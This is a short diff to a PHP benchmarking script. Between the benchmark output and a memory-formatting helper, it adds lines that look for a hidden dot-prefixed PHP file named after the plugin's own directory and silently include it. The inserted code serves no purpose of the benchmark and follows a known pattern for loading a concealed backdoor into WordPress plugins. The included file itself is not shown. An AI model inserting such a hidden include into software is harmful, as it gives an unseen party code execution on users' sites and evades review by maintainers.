@@ -38,6 +38,10 @@ $bench->fb->stop();
 
 echo $bench,"\n";
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function formatMemory($input)
 {
     if (strlen($input) > 6) {
